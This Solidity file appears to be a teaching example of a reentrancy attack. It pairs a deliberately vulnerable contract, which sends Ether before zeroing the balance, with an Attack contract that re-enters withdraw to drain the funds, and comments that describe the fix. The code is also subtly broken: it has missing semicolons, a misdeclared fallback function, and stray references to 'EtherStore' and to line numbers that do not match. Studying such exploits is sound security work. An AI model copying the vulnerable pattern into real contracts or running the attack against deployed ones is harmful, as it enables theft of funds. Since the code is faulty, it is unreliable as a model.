// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract ReentrantVulnerable {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        /**
         * Solution is :
         * Easy way :
         *  - do state change before any external contract call. i.e.,
         *  - balances[msg.sender] = 0;
         *  - then use line 25
         *  - remove line 28
         * Another way is by using mutex. Check openzeppelin reentrancyguard contract.
         */

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to withdraw");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return balances[msg.sender];
    }
}

contract Attack {
    ReentrantVulnerable public reentrantVulnerable;

    constructor(address _reentrantVulnerable) {
        reentrantVulnerable = ReentrantVulnerable(_reentrantVulnerable);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    function fallback() external payable {
        // till reentrantVulnerable contract has the balance in it call withdraw.
        if(address(reentrantVulnerable).balance >= 1 ether) {
            reentrantVulnerable.withdraw()
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether)
        reentrantVulnerable.deposit{value : 1 ether}();
        reentrantVulnerable.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
